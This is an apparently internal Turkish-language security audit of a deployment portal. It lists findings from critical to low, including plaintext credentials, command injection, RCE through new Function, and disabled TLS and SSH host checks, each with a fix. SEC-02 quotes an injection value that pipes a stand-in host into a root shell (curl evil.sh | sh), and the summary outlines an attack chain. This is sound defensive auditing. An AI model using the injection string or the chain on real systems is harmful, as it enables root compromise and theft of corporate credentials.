# IDP — Güvenlik Risk Analizi

> Son güncelleme: 2026-08-20
> Değerlendirme modeli: **CRITICAL** (canlıya çıkamaz) · **HIGH** (kısa vadede kapatılmalı)
> · **MEDIUM** (planlanmalı) · **LOW** (iyileştirme)
>
> Bu portalın tehdit yüzeyi sıradan bir web uygulamasından farklı: portalı ele geçiren kişi
> **kurumsal VPN kimliklerini, vault erişimini ve hedef sunucularda komut çalıştırma
> yetkisini** birden ele geçirir. Bu yüzden "iç ağda çalışıyor" gerekçesi risk azaltıcı
> sayılmamalıdır.

---

## CRITICAL

### SEC-01 — Kimlik bilgileri düz metin diskte ve API üzerinden dışarı veriliyor
**Nerede:** `backend/src/projects.json`, `server.js` `GET /api/projects`, `backend/.gitignore`

Üç ayrı problem iç içe:
1. `projects.json` içinde **gerçek kurumsal kimlikler** düz metin: VPN kullanıcı/parolaları,
   SSH parolaları, Jenkins API token'ı, kurumsal e-posta adresleri.
2. Dosya `.gitignore`'da **yok** → ilk commit'te tüm kimlikler versiyon geçmişine girer.
3. `GET /api/projects` **config objesinin tamamını** döndürüyor → şifreler tarayıcıya
   iniyor, DevTools/Network sekmesinden okunabiliyor, React Query cache'inde duruyor.

**Sömürü:** Portala erişen veya diske erişen herhangi biri kurumsal VPN'e ve hedef
sunuculara doğrudan bağlanabilir. Portal tamamen atlanır.

**Ek bulgu (2026-08-20):** `projects.json` içindeki bir deploy script'inin gövdesine
**canlı bir GitHub Personal Access Token (`ghp_…`) gömülü**. Yani secret'lar yalnızca
tanımlı kimlik alanlarında değil, **serbest metin `scriptContent` alanlarının içinde de**
bulunuyor. Bu, alan bazlı maskelemenin (T-04) tek başına yeterli olmadığını gösteriyor:
`scriptContent` de secret taraması ve `SecretStore` referanslarıyla ele alınmalı.
→ Bu token da rotasyon listesine eklendi (T-03).

**Çözüm:** ① Değerleri hemen rotate ettir · ② `.gitignore`'a ekle · ③ API cevabında
secret alanlarını maskele (`hasPassword: true` gibi) · ④ Diskte şifreli sakla
(Electron'da `safeStorage` → bkz. `03-ELECTRON-MIMARI.md`).

---

### SEC-02 — Komut enjeksiyonu → root
**Nerede:** `backend/src/server.js:153` (`POST /api/vpn/grant-permissions`)

```js
echo "${sudoPassword}" | sudo -S sh -c '...'
```

Kullanıcı girdisi doğrudan shell string'ine gömülüyor. `"; curl evil.sh | sh; #`
gibi bir değer makinede **root olarak** çalışır.

İkinci problem: `sudoers.d` dosyaları `visudo -c` doğrulaması olmadan yazılıyor.
Hatalı bir yazım sudoers'ı bozar → makinede sudo tamamen kullanılamaz hale gelir.

Üçüncü problem: Bu endpoint zaten **kalıcı NOPASSWD** yetkisi veriyor (SEC-08).

**Çözüm:** Endpoint'i tamamen kaldır. Sudo yetkilendirmesi bir **kurulum adımıdır**,
runtime özelliği değil. Electron'da OS'un kendi yetki diyaloğu kullanılacak.

---

### SEC-03 — Uzaktan kod çalıştırma (RCE) — PMP adapter
**Nerede:** `backend/src/adapters/PmpWebAdapter.js:150`

```js
const scriptFn = new Function('page', 'log', this.config.scriptContent);
```

Proje ayarlarına yazılan metin **backend Node process'inde tam yetkiyle** çalışıyor.
`require('fs')`, `require('child_process')` erişilebilir durumda.

**Sömürü zinciri:** `admin/admin` ile giriş yap → herhangi bir projeyi PMP'ye çevir →
scriptContent'e payload yaz → Deploy → backend sunucusunda kod çalıştır → `projects.json`
içindeki tüm kurumsal kimlikleri oku.

**Çözüm:** `new Function` kaldırılacak. Yerine **whitelist'li adım listesi**
(`goto` / `fill` / `click` / `waitFor` / `assert`) — JSON olarak saklanan deklaratif akış.
Serbest script gerekiyorsa ayrı, izole bir worker process + `vm` + kısıtlı global.

---

### SEC-04 — Sabit kimlik ve sabit session secret
**Nerede:** `server.js:53` (`admin`/`admin`), `server.js:31` (`secret: 'super-secret-idp-key'`)

- Parola kaynak kodda sabit; kimse değiştiremiyor.
- Session secret sabit → saldırgan geçerli session cookie'si **üretebilir**, login'i atlar.
- `MemoryStore` kullanılıyor → restart'ta tüm oturumlar düşer, çok işlemli çalışmaz.
- Cookie: `secure: false`, `sameSite` tanımsız.

**Çözüm:** Kullanıcı tablosu + argon2/bcrypt hash · secret `.env`'den (yoksa başlatma) ·
kalıcı session store · `secure`+`sameSite:'lax'` · üretimde HTTPS zorunlu.
Kurumsal ortam için LDAP/AD veya OIDC hedeflenmeli.

---

### SEC-05 — MFA webhook kimlik doğrulaması atlanabiliyor
**Nerede:** `backend/src/routes/mfa.js:20`

```js
if (apiKey && apiKey !== WEBHOOK_API_KEY) { return 401 }
```

`apiKey` hiç gönderilmezse koşul kısa devre yapıyor ve istek **doğrulanmadan** kabul ediliyor.
Ek olarak `sessionId` yoksa `receiveOtp` "ilk bekleyen isteği" çözüyor.

**Sömürü:** Endpoint'e erişebilen biri, bekleyen bir VPN MFA akışına kendi OTP'sini enjekte
edebilir veya OTP tahmin/spam ile MFA'yı yarıştırabilir. Rate limit de yok.

**Çözüm:** API key **zorunlu** + sabit zamanlı karşılaştırma · `sessionId` zorunlu ·
rate limit · varsayılan key (`default-webhook-key-123`) kaldırılsın, yoksa başlatma reddedilsin.

---

## HIGH

### SEC-06 — VPN parolası loglara ve process listesine sızıyor
**Nerede:** `services/vpn/VpnManager.js:15` (maskeleme), `:229` (checkpoint expect), fortinet dalı

Maskeleme argümanın **kendisine** bakıyor:
```js
a.startsWith('--passwd') || a.startsWith('--password') || a.includes('-p') ? '***' : a
```
Fortinet'te argümanlar `['-p', password]` şeklinde ayrı. `-p` maskeleniyor ama
**parolanın kendisi maskelenmiyor** → `[VPN] Executing: ...` satırıyla SSE'ye, tarayıcıya,
sunucu stdout'una ve log buffer'ına düz metin olarak yazılıyor.

Ek sızıntı kanalları:
- `spawn('sudo', ['openfortivpn', ..., '-p', password])` → parola **`ps aux` çıktısında**
  makinedeki her kullanıcıya görünür.
- Checkpoint akışı parolayı `/tmp/idp-trac-*.exp` dosyasına yazıyor (world-readable /tmp).
- OpenVPN kimlik dosyası `/tmp/vpn_creds_*.txt`.

**Çözüm:** Maskelemeyi **argüman değerlerine** göre yap (bilinen secret'ları set'te tut,
log satırında `String.replaceAll` ile temizle) · parolayı **stdin ile** ver, argv'ye asla koyma ·
geçici dosyaları `0600` izinle ve `os.tmpdir()` altında rastgele dizinde oluştur, `finally`'de sil.

---

### SEC-06b — VPN oturum çerezi loglara sızıyor
**Nerede:** `services/vpn/VpnManager.js` — `globalprotect`, `globalprotect-saml`,
`anyconnect` dalları · **Bulunma tarihi:** 2026-08-20 (T-94 sırasında)

T-14'te parolalar için değer-tabanlı log temizleme getirdik ve sorunu çözdük sandık.
Ama temizleyici secret'ları **`vpnConfig`'ten** topluyor; SAML/GlobalProtect oturum
çerezi orada değil — çalışma anında `fetchHeadlessCookie()` veya oturum
cache'inden üretiliyor. Sonuç:

```
[VPN] Executing: openconnect --protocol=gp --cookie portal-userauthcookie=<AÇIK> ...
```

**Neden ciddi:** Bu çerez pratikte bir VPN kimliğidir. Loglar SSE/IPC üzerinden
tarayıcıya akıyor **ve** `deployments.log_text` içinde kalıcı olarak arşivleniyor.
Yani süresi dolana kadar, logu görebilen herkes kurumsal VPN'e bağlanabilir.

**Ders:** "Secret'ları config'ten topla" yaklaşımı, çalışma anında üretilen
secret'ları kapsamıyor. Temizleyicinin kapsamı, secret'ın **doğduğu anda**
genişletilmelidir.

### SEC-07 — TLS doğrulaması kapalı
**Nerede:** `SamlBrowserAuth.js:12`, `AzureAdMfaHandler.js:9` (`rejectUnauthorized: false`),
`WindowsAdapter.js` (`allowInsecure`), PMP "Allow Self-Signed" **varsayılan açık**

**Düzeltme (2026-08-20):** İlk analizde `PmpService`'i "bayrağa bağlı, kabul edilebilir"
diye sınıflandırmıştım — **yanlıştı.** Sertleştirme sırasında görüldü ki servis,
constructor'da tek bir paylaşılan `https.Agent({ rejectUnauthorized: false })` kurup
bunu **her PMP çağrısında koşulsuz** kullanıyordu; `allowSelfSigned` bayrağı hiç dikkate
alınmıyordu. Yani vault trafiği — ki üretim kimliklerini taşıyor — her koşulda
doğrulanmadan gidiyordu. Aynı şekilde `WindowsAdapter`'da varsayılan
`config.allowInsecure !== false` idi, yani **güvensiz taraf varsayılandı.**
Her ikisi de artık güvenli varsayılanla çalışıyor.

VPN kimlik doğrulama akışının tam ortasında sertifika doğrulaması kapalı. MITM yapan
saldırgan SAML akışını ve dolayısıyla VPN oturum cookie'sini ele geçirebilir.

**Çözüm:** Varsayılan **kapalı** olsun; gerekiyorsa proje bazında bilinçli açılsın ve UI'da
kırmızı uyarı göstersin. Kurumsal CA sertifikası `NODE_EXTRA_CA_CERTS` ile yüklensin —
doğru çözüm budur, doğrulamayı kapatmak değil.

---

### SEC-08 — Kalıcı NOPASSWD sudo → yerel yetki yükseltme
**Nerede:** `server.js:153-158`

`openfortivpn` ve `openconnect` için `NOPASSWD` yazılıyor. Bu ikili dosyalar
`--script` benzeri parametrelerle **keyfi komut** çalıştırabilir → makinedeki herhangi bir
kullanıcı parolasız root olur.

**Çözüm:** NOPASSWD verilecekse **tam argüman kısıtıyla** (`Cmnd_Alias` + sabit parametre)
verilsin; tercihen macOS'ta privileged helper (SMJobBless) / Windows'ta servis kullanılsın.

---

### SEC-09 — Yetkilendirme modeli yok
Kimliği doğrulanan **her kullanıcı tam yönetici**. Herhangi biri herhangi bir projenin
`scriptContent`'ini değiştirip Deploy diyebilir → **her hedef sunucuda komut çalıştırma**.
Prod/Dev ayrımı yok, onay yok, proje sahipliği yok.

**Çözüm:** Rol modeli (`viewer` / `deployer` / `admin`) + proje bazlı yetki +
prod deploy için ikinci onay. Bkz. TODO T-30/T-31.

---

### SEC-10 — SSH host key doğrulaması kapalı
**Nerede:** `VpnManager.js` ssh-jump dalı (`StrictHostKeyChecking=no`,
`UserKnownHostsFile=/dev/null`), `SshServerAdapter` (bilinmeyen host kabul)

Bastion ve hedef sunuculara MITM mümkün — kimlik bilgileri saldırgana teslim edilir.

**Çözüm:** Proje ayarında beklenen host key fingerprint alanı; ilk bağlantıda TOFU + kaydet,
sonraki bağlantılarda doğrula, uyuşmazlıkta **deploy'u durdur**.

---

### SEC-11 — Telemetry, vault'u ve hedef sunucuları dövüyor
**Nerede:** `services/TelemetryService.js`, `hooks/useTelemetry.ts` (`refetchInterval: 60000`)

Her Server/WinRM projesi için **dakikada bir**:
- yeni SSH/WinRM oturumu açılıyor,
- `authType === 'pmp'` ise **PMP Vault'tan parola çekiliyor**.

Sonuçlar:
- PMP denetim kaydı gereksiz "parola çekildi" kayıtlarıyla doluyor; birçok vault'ta bu
  **hesap kilitleme / rate limit** tetikler.
- Vault'a giden `reason` alanı `"Automated IDP Deployment"` yazıyor — oysa bu sadece bir
  sağlık kontrolü. **Denetim kaydı yanıltıcı.**
- Parola gereksiz sıklıkta bellekte tutuluyor.
- Dashboard açık kaldıkça sunuculara sürekli bağlantı yükü.

**Çözüm:** Telemetry için ayrı, **salt-okunur ve düşük yetkili** kimlik · vault sonucunu
TTL'li cache'le · polling'i opsiyonel yap (varsayılan kapalı) ve sadece kart görünürken çalıştır ·
`reason` alanını `"IDP Health Check"` olarak ayır.

---

### SEC-12 — Denetim kaydı güvenilmez
**Nerede:** `services/AuditLogger.js`

- Tek kullanıcı olduğu için her satırda `admin` yazıyor → **kim yaptı bilgisi yok**.
- IP, user-agent, request-id, sonuç (başarılı/başarısız) yok.
- Dosya her yazımda tamamen yeniden yazılıyor → eşzamanlı yazımda kayıt kaybı.
- Değiştirilemezlik (tamper-evidence) yok; portalı ele geçiren kendi izini siler.
- Deploy **sonucu** hiç loglanmıyor, sadece tetiklendiği.

**Çözüm:** Append-only format (JSONL) · kullanıcı+IP+sonuç+süre alanları ·
opsiyonel merkezi log hedefi (syslog/SIEM). Electron'da bu **zorunlu** hale gelir çünkü
kayıt kullanıcının kendi makinesinde tutulamaz.

---

## MEDIUM

| Kod | Konu | Nerede / Not |
|---|---|---|
| **SEC-13** | Cookie/CORS sertleştirmesi | `secure:false`, `sameSite` yok; `socket.io` CORS `origin:'*'` |
| **SEC-14** | Rate limit yok | login brute-force, MFA webhook spam, deploy spam |
| **SEC-15** | Girdi doğrulaması yok | `POST /api/projects/:id/settings` gövdeyi olduğu gibi config'e merge ediyor; şema yok, boyut sınırı yok |
| **SEC-16** | SSE log buffer'ı secret taşıyor | Sızan parolalar (SEC-06) 1 saat bellekte kalıyor ve **her yeni abone için baştan replay** ediliyor |
| **SEC-17** | `forceClearAll` fazla agresif | `pkill -f 'openconnect\|openvpn\|openfortivpn'` kullanıcının **kişisel VPN'ini de** öldürür; `/tmp/vpn_*` silme çok kullanıcılı makinede symlink saldırısına açık |
| **SEC-18** | Hata ekran görüntüleri | PMP hatalarında tam sayfa screenshot `public/errors/` altına yazılıyor — portal içeriği/oturum bilgisi içerebilir, temizlenmiyor |
| **SEC-19** | Playwright `--no-sandbox` | Chromium sandbox'ı kapalı çalışıyor |
| **SEC-20** | Bağımlılık hijyeni | `frontend/package.json` içinde `node-ssh` + `node-winrm` (Node kütüphaneleri tarayıcı bağımlılığında); `npm audit` / lockfile denetimi yok |

## LOW

| Kod | Konu |
|---|---|
| **SEC-21** | 24 saatlik oturum, idle timeout yok, ayrıcalıklı işlemlerde yeniden kimlik doğrulama yok |
| **SEC-22** | Hata mesajları iç detay sızdırıyor (stack/host bilgisi UI'a dönüyor) |
| **SEC-23** | `.env.example` gerçek dosya yapısını birebir yansıtmıyor; `MFA_WEBHOOK_API_KEY` orada tanımlı değil |

---

## Özet tablo

| Seviye | Adet | Kapatılmadan canlıya çıkılmamalı |
|---|---|---|
| CRITICAL | 5 | ✅ Evet |
| HIGH | 7 | ✅ Evet |
| MEDIUM | 8 | Planlanmalı |
| LOW | 3 | İyileştirme |

**En kritik zincir:** `admin/admin` (SEC-04) → PMP scriptContent (SEC-03) → backend'de RCE →
`projects.json` (SEC-01) → tüm kurumsal VPN ve sunucu kimlikleri. Bu zincirin **her halkası**
tek başına da kapatılabilir; ilk hedef SEC-04 ve SEC-03.
